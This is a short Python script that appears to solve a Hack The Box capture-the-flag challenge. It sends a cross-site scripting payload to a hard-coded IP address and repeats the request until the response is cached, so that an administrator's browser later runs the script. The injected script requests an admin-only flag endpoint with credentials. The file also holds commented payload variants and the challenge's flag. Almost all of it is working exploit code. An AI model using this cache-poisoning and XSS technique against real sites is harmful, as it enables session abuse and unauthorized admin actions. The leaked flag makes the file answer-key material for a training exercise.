#!/usr/bin/python3

import sys
import requests
from typing import (
    Dict,
    Any
)
from urllib.parse import (
    quote,
    unquote
)
from time import sleep


def send_requests(url: str, data_content: str = None) -> str:
    if data_content:
        while True:
            response = requests.get(url=url+data_content)
            cache = response.headers['X-Cache-Status']
            if cache == "HIT":
                return response.headers
            else:
                continue


def get_headers() -> Dict[Any, Any]:
    pass


def attacking():
    url = "http://159.65.92.208:32752/index.php"
    data_1 = """?content="><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script>&language=en"""
    # data_2 = """?ref="><script>var xhr=new XMLHttpRequest();xhr.open('GET','http://159.65.92.208:32752/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script>&language=de"""
    # data_3 = "?language=de&ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%27/admin.php?reveal_flag=1%27,%20true);xhr.withCredentials%20=%20true;xhr.send();%3C/script%3E"
    response = send_requests(url, data_1)
    print(response)
    # sleep(30)
    
    # first attempt to flag
    print(requests.get(url="http://159.65.92.208:32752/flag.php", headers=response).text)
    
    # second attempt to flag
    print(requests.get(url="http://159.65.92.208:32752/admin.php?reveal_flag=1", headers=response).text)
    
    #  HTB{38eb00cfc8f39eedb3d4fbe4e56512c5} 
    """
    http://159.65.92.208:32719/index.php?content=%22%3e%3cscript%3evar%20xhr%3dnew%20XMLHttpRequest()%3bxhr.open('GET'%2c'%2fadmin.php%3freveal_flag%3d1'%2ctrue)%3bxhr.withCredentials%3dtrue%3bxhr.send()%3b%3c%2fscript%3e&language=de
    """

def main():
    try:
        # while True:
        attacking()
        # sleep(120)
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception:
        sys.exit(1)



if __name__ == "__main__":
    main()
